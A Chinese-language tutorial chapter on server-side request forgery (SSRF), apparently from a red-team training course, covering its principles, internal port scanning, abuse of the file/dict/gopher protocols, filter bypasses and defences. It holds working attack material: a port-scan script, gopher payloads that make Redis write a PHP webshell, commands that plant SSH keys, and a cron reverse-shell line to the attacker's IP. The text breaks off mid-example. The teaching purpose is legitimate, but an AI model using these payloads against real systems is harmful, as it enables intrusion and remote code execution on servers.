---
outline: deep
---

# 第33章 SSRF服务端请求伪造

> **难度等级：🟡 中等级**
>
> **预计学习时间：150分钟**
>
> **本章看点：SSRF原理详解、SSRF危害、SSRF常见场景、内网端口扫描、攻击内网服务、各种协议利用、Gopher协议妙用、SSRF绕过技巧、SSRF防御措施、SSRF+Redis组合利用**
>
> ::: tip 说明
> 上一章我们学习了CSRF（跨站请求伪造），
> 这一章我们来学习另一个带"SRF"的漏洞：
> **SSRF（服务端请求伪造）**。
>
> 名字很像，
> 但其实完全不一样！
>
> - **CSRF**：跨站请求伪造，是客户端的问题，借用户的身份搞事情
> - **SSRF**：服务端请求伪造，是服务端的问题，让服务器帮你发请求
>
> SSRF是一个非常有意思的漏洞，
> 它能让你从外网打进内网，
> 相当于给你开了个"代理"，
> 让你能访问本来访问不到的内网资源。
>
> 在护网行动中，
> SSRF是非常常用的"打点"漏洞，
> 很多时候外网没什么可打的，
> 但一个SSRF就能直接探测内网，
> 甚至直接拿Shell。
>
> 这一章内容比较多，
> 也比较重要，
> 大家坐稳了，
> 发车！
> :::

---

## 📖 本章概述

::: tip 写在前面
很多新手搞不清CSRF和SSRF的区别，
毕竟都叫"请求伪造"。

一句话区分：
- **CSRF**：让**用户的浏览器**发请求 → 客户端问题
- **SSRF**：让**目标服务器**发请求 → 服务端问题

SSRF的核心在于：
> **攻击者能让服务器发起请求，
> 请求的地址由攻击者控制。**

这样攻击者就能：
- 让服务器访问它自己（127.0.0.1）
- 让服务器访问内网其他机器
- 用各种协议（file、dict、gopher等）
- 攻击内网的服务（Redis、MySQL、FastCGI等）
- 读取本地文件
- ...

想想看，
本来你只能访问网站的80/443端口，
现在有了SSRF，
你相当于站在了服务器的位置，
能访问整个内网！

这一章我们会学习：
- 什么是SSRF
- SSRF的原理
- SSRF vs CSRF的区别
- SSRF的危害
- SSRF常见场景
- 用SSRF扫内网端口
- 用SSRF攻击内网服务
- 各种协议的利用（http、file、dict、gopher等）
- Gopher协议的妙用
- SSRF绕过技巧
- SSRF防御措施
- SSRF + Redis未授权组合利用
- 从SSRF到内网渗透

准备好了吗？
开始吧！
:::

---

## 🎯 学习目标

读完本章，你将能够：

- [x] 理解SSRF漏洞的原理
- [x] 区分SSRF和CSRF的不同
- [x] 识别SSRF漏洞的常见场景
- [x] 掌握用SSRF扫描内网端口
- [x] 掌握SSRF各种协议的利用
- [x] 理解Gopher协议的使用
- [x] 掌握常见的SSRF绕过技巧
- [x] 理解SSRF的防御措施
- [x] 了解SSRF攻击内网Redis
- [x] 能识别和验证SSRF漏洞

---

## 🔍 什么是SSRF？

### 0.0 通俗理解：SSRF就是让服务器当你的"内鬼"

用一个生活场景来理解：

**场景：公司前台**

你是一个外面的人（攻击者），你想知道公司内部的一些信息，
比如"总裁办公室有什么文件"。

你进不去公司大门，因为需要门禁卡（内网防火墙把外网访问挡住了）。

但你发现了一个办法：公司前台有一个"帮忙取快递"的服务。
你可以说："请帮我取一下这个地址的快递。"

于是你说："请帮我去 `http://192.168.1.100/internal_docs` 取个快递。"

如果前台不加检查，真的去"取"了——
那前台就成了你的"内鬼"，帮你访问了内网资源，再把结果给你。

**翻译成Web场景：**

```php
// 一个正常的"获取网页内容"功能
$url = $_GET['url'];
$content = file_get_contents($url);  // 服务器去访问这个URL
echo $content;  // 把结果返回给用户

// 正常使用: ?url=https://www.baidu.com → 服务器去百度拿网页，返回给你 ✓

// 恶意使用: ?url=http://127.0.0.1:3306 → 服务器去访问本机的MySQL端口！
// 恶意使用: ?url=http://192.168.1.1/admin → 服务器去访问内网管理后台！
// 恶意使用: ?url=file:///etc/passwd → 服务器去读自己的密码文件！
```

**SSRF 和 CSRF 的区别（非常重要！初学最容易混淆）：**

| 对比维度 | CSRF | SSRF |
|---------|------|------|
| 全称 | Cross-Site Request Forgery | Server-Side Request Forgery |
| 替谁发请求 | 替**用户**（浏览器） | 替**服务器** |
| Cookie在谁那 | 用**用户的**Cookie | 用**服务器的**身份 |
| 攻击目标 | 让用户"帮"你操作 | 让服务器"帮"你访问 |
| 攻击范围 | 用户有权访问的网站 | 服务器能访问的内网/本地 |
| 生活类比 | 借刀杀人（用别人的手） | 找内鬼（让里面的人帮你） |

> **SSRF的核心危害：**
> 服务器通常能访问一些外部访问不到的资源：
> - 127.0.0.1（本机服务，如Redis、MySQL、Memcached）
> - 内网地址（192.168.x.x，如内网管理后台、内部API）
> - 云服务的元数据接口（如 AWS 的 169.254.169.254）
>
> 通过SSRF，攻击者可以利用服务器作为"跳板"，
> 探测和攻击这些原本无法接触的资源。

### 1.1 概念

**SSRF（Server-Side Request Forgery，服务端请求伪造），
是指攻击者能够让服务器发起伪造的请求，
请求的目标地址由攻击者控制。**

说人话就是：
> 正常情况下，
> 你访问网站，
> 网站服务器给你返回内容。
> 
> 但如果有SSRF漏洞，
> 你可以让服务器**替你**去访问某个URL，
> 然后把结果返回给你。
> 
> 你让它访问啥，
> 它就去访问啥。

为什么这很危险？
因为服务器的位置和你不一样：
- 你在外网，可能访问不到内网
- 服务器在内网，能访问内网所有机器
- 你访问不了127.0.0.1的服务
- 服务器可以访问它自己的本地服务

有了SSRF，
你就相当于"站在了服务器的位置"，
能访问服务器能访问的所有东西！

### 1.2 一个简单的例子

让我们用一个最经典的场景来理解：
**图片加载功能。**

假设某网站有个功能：
用户输入一个图片URL，
网站服务器会去下载这张图片，
然后展示给用户。

比如：
```
http://target.com/load_image.php?url=http://example.com/1.jpg
```

服务器收到请求后，
会去访问 `http://example.com/1.jpg`，
把图片下载下来，
然后返回给用户。

看起来挺正常的对吧？

但是！
如果攻击者把url参数改成：
```
http://target.com/load_image.php?url=http://127.0.0.1/
```

会发生什么？

服务器会去访问它自己的80端口！
然后把结果返回给攻击者。

如果改成内网地址呢？
```
http://target.com/load_image.php?url=http://192.168.1.100/
```

服务器会去访问内网的192.168.1.100！

这就是SSRF！
**让服务器替你发请求，
访问你本来访问不到的资源。**

### 1.3 SSRF的本质

SSRF的本质可以用一句话概括：

> **攻击者控制了请求的目标，
> 让服务器去访问攻击者指定的地址。**

正常流程：
```
用户 → 请求 → 服务器 → 访问指定的合法地址 → 返回结果
```

有SSRF的情况：
```
攻击者 → 构造恶意URL → 服务器 → 访问攻击者指定的任意地址 → 返回结果
```

### 1.4 SSRF vs CSRF

很多人分不清，
我们来对比一下：

| 对比项 | CSRF（跨站请求伪造） | SSRF（服务端请求伪造） |
|--------|---------------------|-----------------------|
| **全称** | Cross-Site Request Forgery | Server-Side Request Forgery |
| **核心** | 让用户浏览器发请求 | 让目标服务器发请求 |
| **问题出在哪** | 客户端（浏览器） | 服务端（服务器） |
| **攻击者身份** | 冒充用户 | 让服务器当"代理" |
| **能访问什么** | 用户能访问的 | 服务器能访问的 |
| **危害方向** | 操作用户账号 | 探测/攻击内网 |
| **是否需要用户登录** | 是 | 否 |
| **攻击者能否看到响应** | 一般不能 | 一般能 |

**一个比喻：**
- **CSRF**：你借别人的手打人
- **SSRF**：你借别人的脚走路（走到你去不了的地方）

---

## 💥 SSRF的危害有多大？

SSRF的危害可大可小，
取决于服务器的权限和内网的配置。

### 2.1 危害等级

| 危害等级 | 场景 | 说明 |
|----------|------|------|
| 🟡 中危 | 只能扫端口、探测内网 | 信息泄露 |
| 🟠 高危 | 能读本地文件、攻击内网弱服务 | 严重 |
| 🔴 严重 | 能打Redis、FastCGI等直接拿Shell | 极其严重 |

### 2.2 SSRF能做什么？

我们来详细列一下：

#### 1. 探测内网信息
- 扫描内网IP存活
- 扫描内网端口开放情况
- 识别内网服务（Redis、MySQL、MongoDB等）
- 探测内网Web应用

#### 2. 读取本地文件
- 用file://协议读/etc/passwd
- 读配置文件（config.php等）
- 读日志文件
- 读源码

#### 3. 攻击内网服务
- **Redis未授权访问** → 写公钥拿Shell、写计划任务、写WebShell
- **MySQL** → 爆破、读文件、写Shell
- **MongoDB** → 未授权访问
- **Memcached** → 未授权访问
- **FastCGI** → 命令执行
- **Jenkins** → 未授权访问
- **Elasticsearch** → 未授权访问
- ...等等

#### 4. 攻击本地服务
- 访问本机的服务（127.0.0.1）
- 有些服务只监听本地，外网访问不到
- 但SSRF可以访问

#### 5. 其他利用
- 云环境中获取元数据（AWS、阿里云等）
- 利用gopher协议构造任意TCP数据包
- 打内网的Web漏洞
- 作为内网渗透的跳板

### 2.3 为什么SSRF在护网中这么重要？

因为：
1. **外网入口少**：很多单位外网只有几个Web端口
2. **内网易打**：内网防守薄弱，很多服务未授权、弱口令
3. **SSRF是桥梁**：从外网到内网的桥梁
4. **不容易被发现**：SSRF的流量是服务器发的，不是攻击者直接发的

一个SSRF漏洞，
可能直接打开整个内网的大门！

---

## 🎯 SSRF常见场景

SSRF一般出现在什么地方？
一句话：
**只要服务器会去访问一个URL，
而这个URL用户能控制，
就可能有SSRF。**

### 3.1 常见的触发点

| 场景 | 说明 | 示例 |
|------|------|------|
| **图片加载/下载** | 用户输入图片URL，服务器下载 | `?img=http://xxx/1.jpg` |
| **头像上传（远程）** | 用户填头像URL，服务器抓取 | `?avatar=http://xxx/avatar.jpg` |
| **文章采集/爬虫** | 用户输入URL，服务器爬取内容 | `?url=http://xxx/article.html` |
| **在线翻译** | 翻译指定URL的网页 | `?source_url=http://xxx/` |
| **转码/截图** | 给指定URL生成截图/PDF | `?webpage=http://xxx/` |
| **URL请求功能** | 测试URL是否可访问 | `?check_url=http://xxx/` |
| **第三方服务调用** | 支付、分享等回调 | `?callback=http://xxx/` |
| **文件下载** | 远程文件下载 | `?file_url=http://xxx/xxx.zip` |
| **视频解析** | 解析视频网站URL | `?video_url=http://xxx/` |
| **邮件系统** | 加载外部图片 | 邮件中的图片 |

### 3.2 常见的参数名

如果做黑盒测试，
可以找这些参数名试试：

```
?url=
?src=
?source=
?target=
?link=
?image=
?img=
?pic=
?path=
?file=
?callback=
?feed=
?uri=
?dest=
?redirect=
?go=
?return=
?view=
?to=
?out=
?page=
...
```

看到这些参数，
就可以打个问号：
"会不会有SSRF？"

### 3.3 怎么快速判断有没有SSRF？

最简单的方法：
**让服务器访问一个你能控制的地址，
看有没有请求过来。**

比如：
1. 你有一个公网服务器，或者用DNSLog
2. 让目标访问 `http://你的服务器/ssrf_test`
3. 看你的服务器有没有收到请求

如果收到了，
说明有SSRF！

没有自己的服务器？
可以用这些平台：
- **DNSLog**（dnslog.cn、ceye.io等）
- **Burp Collaborator**
- **RequestBin**
- 等等

---

## 🔍 内网端口扫描

有了SSRF，
第一件事通常是什么？
**扫内网！**

看看内网有哪些机器，
开了哪些端口，
跑了什么服务。

### 4.1 原理

原理很简单：

**根据返回结果的不同，
判断端口是否开放。**

比如：
- 端口开放 → 服务器访问很快就返回（或者返回特定内容）
- 端口关闭 → 服务器访问超时，或者返回连接失败

通过不同的响应时间、响应内容，
就能判断端口开没开。

### 4.2 判断方法

常见的判断方法：

#### 方法1：根据响应时间
- 开放的端口：响应快（比如几百毫秒）
- 关闭的端口：响应慢（比如超时，好几秒）

#### 方法2：根据响应内容
- 开放的端口：可能返回Banner、或者"连接被拒绝"以外的内容
- 关闭的端口：返回"Connection refused"、"连接失败"等

#### 方法3：根据状态码
- 有些情况下会返回不同的HTTP状态码
- 或者不同的错误信息

### 4.3 扫描步骤

**第一步：先确定内网网段**

可以先读一下 `/etc/hosts`、
`/proc/net/arp`、
`/proc/net/fib_trie` 等文件，
看看内网IP。

或者先猜常见的网段：
- 192.168.0.0/16
- 10.0.0.0/8
- 172.16.0.0/12
- 100.64.0.0/10

**第二步：扫存活主机**

先Ping一下（如果可以的话），
或者直接扫常用端口。

**第三步：扫端口**

常见的端口：
- 21（FTP）
- 22（SSH）
- 23（Telnet）
- 25（SMTP）
- 53（DNS）
- 80/443（HTTP/HTTPS）
- 110/143/993/995（邮件）
- 389（LDAP）
- 445（SMB）
- 3306（MySQL）
- 3389（RDP）
- 5432（PostgreSQL）
- 5900（VNC）
- 6379（Redis）
- 7001/7002（WebLogic）
- 8080/8443（常见Web端口）
- 8000-9000（各种Web服务）
- 9200/9300（Elasticsearch）
- 11211（Memcached）
- 27017（MongoDB）
- ...等等

**第四步：识别服务**

根据端口和返回内容，
判断是什么服务。

### 4.4 示例

假设我们有一个SSRF点：
```
http://target.com/ssrf.php?url=xxx
```

我们来扫192.168.1.1的6379端口（Redis）：

```
http://target.com/ssrf.php?url=http://192.168.1.1:6379/
```

如果很快返回了，
而且返回内容里有类似 `-NOAUTH Authentication required` 或者 `+PONG` 之类的，
说明Redis开了，而且可能未授权！

如果等了很久才返回，
或者报连接错误，
说明端口没开。

### 4.5 自动化扫描

手动扫太慢了，
可以写脚本批量扫。

简单的Python脚本示例：
```python
import requests
import time

url = "http://target.com/ssrf.php?url="

# 扫描端口列表
ports = [21, 22, 80, 443, 3306, 3389, 6379, 8080, 9200, 11211, 27017]

# 扫描192.168.1.1-254
for i in range(1, 255):
    ip = f"192.168.1.{i}"
    for port in ports:
        target = f"http://{ip}:{port}/"
        try:
            start = time.time()
            r = requests.get(url + target, timeout=10)
            elapsed = time.time() - start
            
            # 根据响应时间和内容判断
            if elapsed < 3:  # 响应快，可能开了
                print(f"[+] {ip}:{port} 可能开放，耗时：{elapsed:.2f}s")
                print(f"    响应前100字节：{r.text[:100]}")
        except:
            pass
```

当然，
实际情况可能更复杂，
需要根据具体场景调整。

---

## 📡 SSRF中各种协议的利用

SSRF不只是能发HTTP请求，
很多情况下还支持其他协议！

支持什么协议，
取决于服务器用什么函数/库来发请求。

### 5.1 常见协议一览

| 协议 | 作用 | 利用场景 |
|------|------|----------|
| **http/https** | 发HTTP请求 | 扫端口、打内网Web |
| **file** | 读本地文件 | 读/etc/passwd、读源码、读配置 |
| **dict** | 字典服务器协议 | 探测端口、探测Redis等 |
| **gopher** | 老协议，能发任意TCP数据 | 打Redis、打MySQL、打FastCGI等 |
| **ftp** | 文件传输协议 | 探测、可能有其他利用 |
| **sftp** | SSH文件传输 | 探测 |
| **ldap** | 轻量目录访问协议 | 探测、可能有其他利用 |
| **tftp** | 简单文件传输 | UDP探测 |
| **smb** | 微软文件共享 | 探测、NTLM中继等 |

不是所有情况都支持这么多协议，
要看具体的实现。

比如PHP的：
- `file_get_contents()` 支持很多协议
- `curl` 支持的协议也很多
- `fsockopen()` 主要是TCP

我们一个个来讲。

### 5.2 http/https 协议

这是最基础的，
几乎所有SSRF都支持。

**用途：**
- 扫端口
- 访问内网Web应用
- 打内网的Web漏洞
- 探测服务

**示例：**
```
http://target.com/ssrf.php?url=http://127.0.0.1/
http://target.com/ssrf.php?url=https://192.168.1.100:8443/
```

### 5.3 file 协议

**用途：读取本地文件**

如果支持file协议，
那就爽了，
可以直接读服务器上的文件！

**示例：**
```
# 读/etc/passwd
http://target.com/ssrf.php?url=file:///etc/passwd

# 读网站配置文件
http://target.com/ssrf.php?url=file:///var/www/html/config.php

# 读源码
http://target.com/ssrf.php?url=file:///var/www/html/index.php
```

**注意：**
- file协议后面是三个斜杠：`file:///`
- 路径是绝对路径
- 需要知道文件路径（或者猜）

**常用的文件路径：**

Linux：
```
/etc/passwd          # 用户信息
/etc/shadow          # 密码哈希（需要root）
/etc/hosts           # hosts文件
/etc/hostname        # 主机名
/etc/resolv.conf     # DNS配置
/proc/net/arp        # ARP表（看内网其他机器）
/proc/net/fib_trie   # 路由表（看网段）
/proc/net/tcp        # TCP连接
/proc/net/udp        # UDP连接
/proc/self/cmdline   # 当前进程命令行
/proc/self/environ   # 环境变量
/root/.ssh/id_rsa    # root的SSH私钥（如果有）
~/.ssh/id_rsa        # 当前用户的SSH私钥
/var/www/html/       # Web目录
```

Windows：
```
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini
C:\Windows\win.ini
...
```

### 5.4 dict 协议

dict协议本来是查字典的，
但在SSRF中可以用来：
- 探测端口是否开放
- 探测一些基于文本的服务
- 给Redis发简单命令

**示例：**
```
# 探测6379端口（Redis）
http://target.com/ssrf.php?url=dict://127.0.0.1:6379/info

# 探测3306端口（MySQL）
http://target.com/ssrf.php?url=dict://127.0.0.1:3306/
```

dict协议的好处是，
有些情况下http协议不行，
但dict协议可以。

### 5.5 gopher 协议

**gopher协议是SSRF的神器！**

为什么？
因为gopher协议可以**发送任意TCP数据包**！

这意味着什么？
只要是TCP的服务，
理论上都能用gopher协议打！

比如：
- 打Redis → 写WebShell、写公钥、写计划任务
- 打MySQL → 执行SQL
- 打FastCGI → 命令执行
- 打SMTP → 发邮件
- 打内网的其他服务...

**gopher协议格式：**
```
gopher://host:port/_数据
```

下划线 `_` 后面就是要发送的数据，
数据需要URL编码。

**示例（打Redis）：**
```
gopher://127.0.0.1:6379/_%0A%0AINFO%0A
```

这个就是给Redis发一个INFO命令。

gopher协议非常强大，
我们后面会专门讲。

### 5.6 其他协议

- **ftp/sftp**：探测端口，有些情况下可能有其他利用
- **ldap**：探测，或者利用LDAP注入
- **tftp**：UDP协议，有些情况下可以用来探测内网
- **smb**：可以用来探测，甚至NTLM中继获取Hash

支持哪些协议，
需要具体情况具体测试。

---

## 🚀 Gopher协议的妙用

Gopher协议是SSRF中最强大的协议，
没有之一。

掌握了gopher，
SSRF的威力直接上一个档次。

### 6.1 Gopher协议是什么？

Gopher是一个很老的协议，
比HTTP还老，
现在基本不用了。
但很多语言的HTTP请求库还支持它。

Gopher协议的特点是：
**你发什么数据，
它就原封不动地给服务器发过去。**

这就给了我们很大的发挥空间。

### 6.2 Gopher协议格式

```
gopher://IP:端口/_要发送的数据
```

注意：
- 下划线 `_` 是必须的，表示后面是数据
- 数据需要URL编码
- 注意换行符（%0d%0a 或 %0a）
- 有些情况下开头需要加一个换行

### 6.3 Gopher打Redis

Redis是最常见的内网服务，
而且经常未授权，
所以SSRF + Redis 是经典组合。

#### Redis未授权能做什么？

1. **写WebShell**（如果知道Web目录）
2. **写SSH公钥**（如果是root且开启了SSH）
3. **写计划任务**（Linux）
4. **写启动项**（Windows）
5. **主从复制RCE**（Redis 4.x/5.x）
6. **Lua沙箱绕过**
7. ...等等

我们来看看怎么用gopher打。

#### 示例1：执行Redis命令

比如执行INFO命令：
```
gopher://127.0.0.1:6379/_INFO%0d%0a
```

或者：
```
gopher://127.0.0.1:6379/_%0aINFO%0a
```

#### 示例2：写WebShell

假设Web目录是 `/var/www/html/`，
我们写一个Shell进去：

Redis命令：
```
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET test "<?php @eval($_POST['cmd']); ?>"
SAVE
```

转成gopher协议（需要URL编码）：
```
gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html/%0d%0aconfig%20set%20dbfilename%20shell.php%0d%0aset%20test%20%22%3C%3Fphp%20@eval(%24_POST%5B'cmd'%5D)%3B%20%3F%3E%22%0d%0asave%0d%0a
```

访问这个URL，
就能在Web目录下生成shell.php！

然后就可以用蚁剑连接了。

#### 示例3：写SSH公钥

如果Redis是root运行的，
可以写SSH公钥：

Redis命令：
```
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET x "\n\n你的公钥\n\n"
SAVE
```

然后转成gopher格式。

这样你就能用私钥直接SSH登录了！

#### 示例4：写计划任务（CentOS）

```
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET xxx "\n\n*/1 * * * * bash -i >& /dev/tcp/你的IP/4444 0>&1\n\n"
SAVE
```

每分钟反弹一个Shell到你的服务器。

#### 注意事项

- Redis版本不同，命令可能有差异
- 有些Redis需要认证（有密码）
- 写文件的时候注意换行，否则可能有问题
- 生成gopher payload的时候注意编码

### 6.4 Gopher打MySQL

如果内网有MySQL，
也可以试试用gopher打。

比如：
- 未授权访问
- 弱口令爆破（比较难）
- 读文件
- 写Shell
- UDF提权

不过MySQL的协议比较复杂，
构造起来麻烦一些，
有兴趣的同学可以自己研究。

### 6.5 Gopher打FastCGI

如果内网有PHP-FPM（FastCGI），
而且监听在TCP端口（比如9000），
那可以用gopher协议打FastCGI，
直接命令执行！

这个威力很大，
但场景相对少一些。

### 6.6 Gopher Payload生成工具

手动构造gopher payload太麻烦了，
可以用工具生成：

- **Gopherus**：专门生成gopher payload的工具
  - 支持Redis、MySQL、FastCGI、Memcached等
  - GitHub上可以找到
- **自己写脚本生成**

Gopherus示例：
```bash
# 生成Redis写Shell的payload
python gopherus.py --exploit redis

# 生成FastCGI RCE的payload
python gopherus.py --exploit fastcgi
```

非常方便！

---

## 🔓 SSRF绕过技巧

有攻击就有防御，
有防御就有绕过。

很多网站会做一些SSRF防护，
比如过滤内网IP、限制协议等。
我们来看看怎么绕过。

### 7.1 绕过localhost/127.0.0.1过滤

很多人会过滤 `127.0.0.1` 和 `localhost`，
但有很多绕过方法。

#### 方法1：IP进制转换

- **十进制**：`2130706433`（127.0.0.1的十进制）
- **八进制**：`0177.0.0.1`（前面加0表示八进制）
- **十六进制**：`0x7f000001` 或 `0x7f.0.0.1`
- **二进制**：有些地方支持

127.0.0.1的各种表示：
```
127.0.0.1
2130706433          # 十进制
0x7f000001           # 十六进制
017700000001         # 八进制
0x7f.0x0.0x0.0x1     # 每个字节十六进制
```

#### 方法2：特殊的IP表示

- `127.1` → 127.0.0.1
- `127.0.1` → 127.0.0.1
- `127.0.0.1.nip.io` → 解析到127.0.0.1
- `127.0.0.1.sslip.io` → 解析到127.0.0.1

#### 方法3：用DNS解析到127.0.0.1

很多域名解析到127.0.0.1：
- `localhost`
- `localtest.me`
- `127.0.0.1.nip.io`
- `lvh.me`
- 等等

或者自己注册一个域名，
解析到127.0.0.1。

如果对方只过滤了IP，
没过滤域名，
而域名又会被解析成127.0.0.1，
那就绕过了。

#### 方法4：用[::1]

IPv6的本地地址：
```
http://[::1]/
```

有些程序支持IPv6的话，
这也是127.0.0.1的等价物。

### 7.2 绕过内网IP过滤

如果对方过滤了内网网段（192.168.x.x、10.x.x.x等），
怎么办？

#### 方法1：进制转换（同上）

把内网IP转成十进制、八进制、十六进制。

比如192.168.1.1：
```
十进制：3232235777
十六进制：0xc0a80101
八进制：030052000401
```

#### 方法2：短地址/省略写法

```
192.168.1.1
192.168.257   # 256+1 = 257？不对，进位的那种
10.1          # 10.0.0.1
```

#### 方法3：DNS重绑定

如果服务器会先解析DNS判断是不是内网，
然后再请求，
那就可能有DNS重绑定的问题。

就是第一次解析返回外网IP（通过检查），
第二次解析返回内网IP（实际请求）。

不过这个比较复杂，
实战中用得不多。

#### 方法4：302跳转

如果目标服务器会跟随跳转，
那可以让它先访问一个外网地址，
那个地址302跳转到内网地址。

比如：
```
http://target.com/ssrf.php?url=http://attacker.com/redirect.php
```

而 `http://attacker.com/redirect.php` 返回302跳转到 `http://192.168.1.1/`。

如果服务器跟随跳转，
就绕过了！

#### 方法5：协议不一致

比如检查的时候按HTTP检查，
实际用gopher、dict等协议。

### 7.3 绕过协议限制

如果对方只允许http/https协议，
怎么办？

#### 方法1：看看有没有其他方式

比如：
- file协议试试
- dict协议试试
- gopher协议试试

万一没过滤呢？

#### 方法2：利用URL解析问题

有些URL解析器有bug，
比如：
```
http://127.0.0.1#@attacker.com/
```

不同的解析器可能解析出不同的结果。

#### 方法3：利用@符号

URL里的@符号：
```
http://attacker.com@127.0.0.1/
```

正常浏览器会认为host是127.0.0.1，
但有些解析器可能认为是attacker.com。

如果检查的解析器和实际请求的解析器不一样，
就可能绕过。

### 7.4 其他绕过思路

- **URL编码**：把IP编码一下试试
- **添加端口**：有些过滤没考虑端口
- **短链接**：用短链接服务跳转
- **CDN**：有些CDN的IP可能被误判
- **云服务元数据**：AWS的169.254.169.254，阿里云的100.100.100.200

绕过SSRF防护的方法很多，
需要具体情况具体分析，
多多尝试！

---

## 🛡️ SSRF防御措施

讲完攻击，
我们来讲讲防御。

### 8.1 防御方法总览

| 防御方法 | 原理 | 安全性 | 推荐度 |
|----------|------|--------|--------|
| **协议限制** | 只允许http/https | 中 | ⭐⭐⭐ |
| **域名白名单** | 只允许访问指定域名 | 高 | ⭐⭐⭐⭐ |
| **内网IP过滤** | 禁止访问内网IP | 中高 | ⭐⭐⭐⭐ |
| **不返回响应内容** | 不让用户看到请求结果 | 中 | ⭐⭐⭐ |
| **统一错误信息** | 端口开不开都返回一样 | 中 | ⭐⭐⭐ |
| **权限最小化** | 服务以低权限运行 | 高 | ⭐⭐⭐⭐⭐ |
| **禁用不必要的协议** | 只保留需要的协议 | 高 | ⭐⭐⭐⭐ |

### 8.2 协议限制

**最基本的：只允许http和https协议。**

把file、dict、gopher、ftp等协议都禁掉。

但这只是最基础的，
因为http协议也能扫端口、打内网Web。

### 8.3 域名白名单

**只允许访问指定的域名。**

比如图片加载功能，
只允许访问几个可信的图片域名。

这是比较安全的做法，
但适用场景有限。

注意：
- 白名单要严格匹配
- 注意域名解析的问题
- 注意子域名的问题

### 8.4 内网IP过滤

**禁止访问内网和本地IP。**

比如：
- 127.0.0.0/8
- 10.0.0.0/8
- 172.16.0.0/12
- 192.168.0.0/16
- 169.254.0.0/16
- 100.64.0.0/10
- [::1] 等IPv6内网地址
- 0.0.0.0
- 等等

**怎么实现？**
1. 解析域名得到IP
2. 判断IP是不是内网
3. 是内网就拒绝

**注意：**
- 要注意DNS重绑定问题
- 解析后立刻检查，然后立刻请求（中间可能有DNS缓存变化）
- 要考虑各种IP表示方式（十进制、八进制、十六进制等）
- 要考虑IPv6

### 8.5 不返回响应内容

如果只是为了下载图片，
没必要把响应内容直接返回给用户。

可以：
- 服务器下载后保存到本地
- 然后返回一个本地的URL
- 用户访问本地URL拿到图片

这样即使有SSRF，
攻击者也看不到响应内容，
危害会小很多。

### 8.6 统一错误信息

端口开放和关闭，
都返回一样的错误信息，
不要返回连接超时、连接拒绝之类的。

这样攻击者就很难判断端口开没开，
增加扫描难度。

### 8.7 权限最小化

运行Web服务的用户，
权限尽量小：
- 不要用root
- 不要用administrator
- 用专门的低权限用户
- 只给必要的权限

这样即使有SSRF，
即使打穿了，
危害也会小一些。

### 8.8 防御的最佳实践

1. **协议限制**：只允许必要的协议
2. **域名白名单**：能加白名单就加
3. **内网IP过滤**：禁止访问内网
4. **不返回原始响应**：只返回必要的信息
5. **统一错误信息**：增加扫描难度
6. **权限最小化**：降低被攻破后的影响
7. **定期更新**：修复URL解析库的漏洞

**纵深防御，多层防护！**

---

## 📚 案例讲解

讲了这么多理论，
我们来看几个真实的案例。

### 案例1：通过SSRF扫描内网端口

**场景描述：**
某网站有一个图片远程上传功能，
存在SSRF漏洞。

**漏洞详情：**
```
http://target.com/upload_avatar.php?url=http://example.com/1.jpg
```

url参数用户可控，
服务器会去访问这个URL，
然后返回结果。

**利用过程：**

**第一步：验证SSRF**

先用DNSLog或者自己的服务器验证：
```
http://target.com/upload_avatar.php?url=http://xxx.dnslog.cn/ssrf_test
```

看DNSLog有没有记录，
有记录说明存在SSRF。

**第二步：读取本地文件，收集信息**

试试file协议：
```
http://target.com/upload_avatar.php?url=file:///etc/passwd
```

如果能读到，
就知道了系统用户。

再读其他文件：
```
# 读hosts，看内网
file:///etc/hosts

# 读arp表，看内网其他机器
file:///proc/net/arp

# 读环境变量
file:///proc/self/environ
```

**第三步：扫内网端口**

假设发现内网网段是192.168.1.0/24，
开始扫端口：

```
# 扫192.168.1.1的常见端口
http://target.com/upload_avatar.php?url=http://192.168.1.1:22/
http://target.com/upload_avatar.php?url=http://192.168.1.1:80/
http://target.com/upload_avatar.php?url=http://192.168.1.1:3306/
http://target.com/upload_avatar.php?url=http://192.168.1.1:6379/
http://target.com/upload_avatar.php?url=http://192.168.1.1:8080/
...
```

根据响应时间和内容，
判断哪些端口开放。

**第四步：发现Redis未授权**

扫到192.168.1.100的6379端口开放，
而且返回内容像Redis：
```
-NOAUTH Authentication required
```

或者直接返回PONG（未授权）。

**第五步：攻击Redis**

用gopher协议打Redis：
```
# 先试试能不能执行命令
http://target.com/upload_avatar.php?url=gopher://192.168.1.100:6379/_INFO%0d%0a
```

如果能返回Redis信息，
说明可以利用。

然后写WebShell、写公钥、写计划任务...

**总结：**
一个SSRF漏洞，
从外网直接打进内网，
拿下服务器！

---

### 案例2：SSRF攻击内网Redis拿Shell

**场景描述：**
接上一个案例，
我们发现了内网的Redis未授权，
现在用SSRF打Redis拿Shell。

**目标：**
通过SSRF + Redis，
获取服务器的Shell。

**方法1：写WebShell**

首先确定Web目录，
比如通过读源码、报错信息等，
知道Web目录是 `/var/www/html/`。

构造Redis命令：
```
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload "<?php @eval($_POST['x']); ?>"
SAVE
```

转成gopher URL（URL编码）：
```
gopher://192.168.1.100:6379/_config%20set%20dir%20/var/www/html/%0d%0aconfig%20set%20dbfilename%20shell.php%0d%0aset%20payload%20%22%3C%3Fphp%20@eval(%24_POST%5B'x'%5D)%3B%20%3F%3E%22%0d%0asave%0d%0a
```

通过SSRF访问这个URL，
Redis就会在Web目录下生成shell.php。

然后用蚁剑连接：
```
URL：http://192.168.1.100/shell.php
密码：x
```

不对，192.168.1.100是内网，
我们访问不到...

怎么办？
没关系，
我们有SSRF啊！
可以通过SSRF访问这个Shell：
```
http://target.com/upload_avatar.php?url=http://192.168.1.100/shell.php?x=phpinfo();
```

或者直接用gopher发POST请求...
有点麻烦，但可行。

**方法2：写SSH公钥**

如果Redis是root运行的，
而且开了SSH，
可以写SSH公钥。

把你的公钥写入：
```
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAAB3NzaC1yc2E... your@email.com\n\n"
SAVE
```

然后转成gopher格式，
通过SSRF发送。

但还是那个问题：
192.168.1.100是内网，
我们SSH连不上...

这时候怎么办？
可以让目标反弹Shell啊！

**方法3：写计划任务反弹Shell**

写一个计划任务，
每分钟反弹Shell到你的公网服务器：

Redis命令：
```
